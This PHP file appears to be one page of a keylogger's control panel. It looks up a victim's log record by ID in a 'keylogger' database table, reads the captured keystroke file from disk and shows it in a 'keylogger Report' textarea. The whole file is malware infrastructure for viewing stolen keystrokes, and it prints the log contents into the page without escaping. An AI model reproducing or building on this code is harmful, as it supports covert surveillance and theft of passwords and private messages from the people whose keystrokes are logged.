<?php include('header.php'); ?>


<?php

$id = intval($_GET['id']);


function safe_d($data){

    $data =  strip_tags($data);
    $data =  htmlspecialchars($data);

    return $data;
  }

if(isset($id)){


    $q_hwid = mysqli_query($condb,"SELECT * FROM `keylogger` WHERE `ID_k`='$id'");
    $get_a = @mysqli_fetch_array($q_hwid);
    $File_keylog = "../".$get_a['File_keylog'];
   $loc = file_get_contents(safe_d($File_keylog));


    echo '</div><div class="row">
    <div class="col-md-12">
                 <!--Panel News-->
                 <div class="panel panel-default" style="background-image: linear-gradient(to bottom,#232323 0,#232323 100%); margin-top:10px;">
         <div class="panel-heading">
           <h3 class="panel-title">keylogger Report</h3>
         </div>
         <div class="panel-body">
           <div class="row">
             <div class=" col-md-12 col-lg-12">  <div class="form-group">
             ';

             echo "<textarea class='col-md-12 col-lg-12 col-xs-12'  rows='30' style='color:#00FF66;background:#000;' name='de64'>";
               echo $loc;
             echo "</textarea>  </div>
             ";
                
               
             echo '</div>
           </div>
         </div>
   </div>






                    <!--Panel News-->
     </div>
</div>';



}




?>





<?php include('footer.php'); ?>